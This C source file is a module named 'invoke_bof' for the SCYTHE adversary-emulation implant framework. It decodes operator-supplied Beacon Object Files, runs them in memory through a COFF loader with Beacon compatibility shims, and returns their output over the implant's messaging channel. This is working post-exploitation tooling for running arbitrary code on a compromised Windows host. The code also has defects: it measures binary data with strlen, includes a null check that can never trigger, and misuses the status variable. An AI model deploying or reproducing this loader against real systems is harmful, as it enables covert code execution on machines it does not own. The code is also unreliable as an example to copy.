/*++

 Copyright (c) SCYTHE, Inc. Use is subject to agreement.

 --*/
#pragma warning(disable:4996)
#include <windows.h>
#include "common.h"

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include "asprintf.h"

#include "nxjson.h"
#include "COFFLoader.h"
#include "beacon_compatibility.h"
#include <winternl.h>
#include <Wincrypt.h>
#pragma comment(lib, "crypt32.lib")

DECLARE_DBGPRINT(NULL);
PSCYTHE_CLIENT g_pClient = NULL;


// {3d34bf40-c026-11ec-810c-33e4a10903dc}
static const GUID invoke_bofModuleId =
{ 0x3d34bf40, 0xc026, 0x11ec, { 0x81, 0x0c, 0x33, 0xe4, 0xa1, 0x09, 0x03, 0xdc}};

struct params {
    const char* filename;
    const char* filebytes;
    const char* funcname;
    const char* filepath;
    const char* params;
    int file_size;
    int is_vfs;
};

void parseJSON(char* request, struct params* p);
PBYTE DecodeBase64String(__in PSTR pszBase64String, __inout PDWORD pdwSize, __inout PDWORD pdwStatus);


static char* decoding_table = NULL;
static int mod_table[] = { 0, 2, 1 };

static const SCYTHE_MODULE_TYPE invoke_bofModuleType = CATEGORY_WORKER;


__checkReturn __success(return == SCYTHE_NOERROR) INT init(__in PSCYTHE_CLIENT pClient, __in_opt PVOID pvReserved)
{
    UNREFERENCED_PARAMETER(pvReserved);

    DBGPRINT("invoke_bof::init function called.\n");
    
    g_pClient = pClient;
        
    return SCYTHE_NOERROR;
}

__checkReturn __success(return == SCYTHE_NOERROR) ERROR_T run(__in PSCYTHE_MESSAGE pMessage, __in_opt PVOID pvReserved)
{
    ERROR_T status = SCYTHE_NOERROR;

    UNREFERENCED_PARAMETER(pvReserved);
    
    DBGPRINT("invoke_bof::run function was called.");
    char *resp = "";
    unsigned char* arguments = NULL;
    int argumnetSize = 0;
    unsigned char* coff_data = NULL;
    char* outdata = NULL;
    int outdataSize = 0;
    uint32_t filesize = 0;
    int checkcode = 0;
    char* req = (char*)pMessage->Message;
    struct params p;
    parseJSON(req, &p);
    if (&p == NULL) {
        asprintf(&resp, "Error: While Decoding JSON String %s", req);
        goto RESP;
    }
   
    if (p.is_vfs == 1){
        DWORD dwLength = 0;
        coff_data = DecodeBase64String(p.filebytes, &dwLength, (PDWORD)&status);
        if (coff_data == NULL) {
            asprintf(&resp, "Error: loading data from %s\n", p.filename);
            return status;
        }//end 
        filesize = strlen(coff_data);
        asprintf(&resp, "Contents of %s, Size: %lu\n", p.filename, filesize);
    }
    else {
        getContents(p.filepath, &filesize, &coff_data);
        if (coff_data == NULL) {
            asprintf(&resp, "Error: Loading data from %s\n", p.filepath);
            goto RESP;
        }//end 
   
    }//end 
    // TODO: implement handling for arguments. here!
    if (p.params != NULL) {
        arguments = (unsigned char*) p.params;
        asprintf(&arguments, arguments, "\0");
        argumnetSize = strlen(arguments);
    }//end if
    
    checkcode = RunCOFF(p.funcname, coff_data ,filesize, arguments, argumnetSize);
  
    if (checkcode == 0) {
        asprintf(&status, "Ran/Parsed the coff: %s\n", p.filename);
        outdata = BeaconGetOutputData(&outdataSize);
        if (outdata != NULL){
            asprintf(&resp, "Output Data Below:\n\n %s\n", outdata);
        }
    }

    else {
        asprintf(&resp, "Error: Failed to run/parse the COFF file: %s\n", p.filename);
        goto RESP;
    }

    RESP:
    if (coff_data != NULL) {
        free(coff_data);
    }
    
    status = g_pClient->PostToMessagingSubsystem(pMessage->MessageId, 0, 0,
                  CATEGORY_OUTPUT_COMMUNICATION,
                  &invoke_bofModuleId,
                  NULL,
                  strlen(resp), (LPCBYTE)resp);
  
    return status;
}

__checkReturn __success(return == SCYTHE_NOERROR) ERROR_T getinfo(__inout PSCYTHE_MODULE_INFORMATION pInformation)
{
    ERROR_T status = SCYTHE_ERROR_INVALID_PARAMETER;

    DBGPRINT("invoke_bof::getinfo function was called.");
    if (NULL != pInformation)
    {
        if (pInformation->cbSize >= sizeof(SCYTHE_MODULE_INFORMATION))
        {
            pInformation->ModuleVersion.wMajor = 1;
            pInformation->ModuleVersion.wMinor = 0;
            pInformation->ModuleType = invoke_bofModuleType;
            memcpy(&(pInformation->ModuleId), &invoke_bofModuleId, sizeof(GUID));
            status = SCYTHE_NOERROR;
        }
    }

    return status;
}

// Required function: deinit
__checkReturn __success(return == SCYTHE_NOERROR) ERROR_T deinit(__in PVOID pvReserved)
{
    UNREFERENCED_PARAMETER(pvReserved);

    DBGPRINT("invoke_bof::deinit function was called.");
    return SCYTHE_NOERROR;
}


BOOL WINAPI DllMain(__in HINSTANCE hinstDLL, __in DWORD fdwReason, __in LPVOID lpvReserved)
{
    UNREFERENCED_PARAMETER(lpvReserved);
    UNREFERENCED_PARAMETER(hinstDLL);

    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        INITIALIZE_DBGPRINT(NULL);
        DBGPRINT("invoke_bof: DLL_PROCESS_ATTACH");

        break;
    case DLL_PROCESS_DETACH:
        DBGPRINT("invoke_bof: DLL_PROCESS_DETACH");
        break;
    default:
        break;
    }

    return TRUE;
}

void parseJSON(char* request, struct params* p) {
    const nx_json* json = nx_json_parse_utf8(request);
    if (json) {
        if (nx_json_get(json, "filename") != NX_JSON_NULL) {
            p->filename = nx_json_get(json, "filename")->text_value;
        }//end
        if (nx_json_get(json, "filebytes") != NX_JSON_NULL) {
            p->filebytes = nx_json_get(json, "filebytes")->text_value;
        }
        if (nx_json_get(json, "funcname") != NX_JSON_NULL) {
            p->funcname = nx_json_get(json, "funcname")->text_value;
        }
        if (nx_json_get(json,"is_vfs") != NX_JSON_NULL) {
            p->is_vfs = atoi(nx_json_get(json,"is_vfs")->text_value);
        }
        if (nx_json_get(json,"filepath") != NX_JSON_NULL) {
            p->filepath = nx_json_get(json,"filepath")->text_value;
        }
        if (nx_json_get(json, "filesize") != NX_JSON_NULL) {
            p->file_size = atoi(nx_json_get(json, "filesize")->text_value);
        }
        if (nx_json_get(json, "params") != NX_JSON_NULL) {
            p->params = nx_json_get(json, "params")->text_value;
        }
        else if (nx_json_get(json, "params") == NX_JSON_NULL) {
            p->params = NULL;
        }
    }
    nx_json_free(json);
}

PBYTE DecodeBase64String(__in PSTR pszBase64String, __inout PDWORD pdwSize, __inout PDWORD pdwStatus)
{
    DWORD dwContentSize = 0;
    PBYTE pbBuffer = NULL;
    if (CryptStringToBinaryA(pszBase64String, (DWORD)strlen(pszBase64String), CRYPT_STRING_BASE64, NULL, &dwContentSize, NULL, NULL))
    {
        if (dwContentSize)
        {
            //+1 adds a null terminator to the end of the CryptStringtoBinaryA
            SIZE_T sz = (SIZE_T)dwContentSize + 1;
            pbBuffer = (PBYTE)malloc(sz);
            if (pbBuffer != NULL)
            {
                ZeroMemory(pbBuffer, sz);
                if (CryptStringToBinaryA(pszBase64String, (DWORD)strlen(pszBase64String), CRYPT_STRING_BASE64, pbBuffer, &dwContentSize, NULL, NULL))
                {
                    //Success
                    *pdwSize = dwContentSize;
                }
                else
                {
                    *pdwStatus = GetLastError();
                    free(pbBuffer);
                    pbBuffer = NULL;
                }
            }
            else
            {
                *pdwStatus = GetLastError();
            }
        }
        else
        {
            *pdwStatus = GetLastError();
        }
    }
    else
    {
        *pdwStatus = GetLastError();
    }
    return pbBuffer;
}

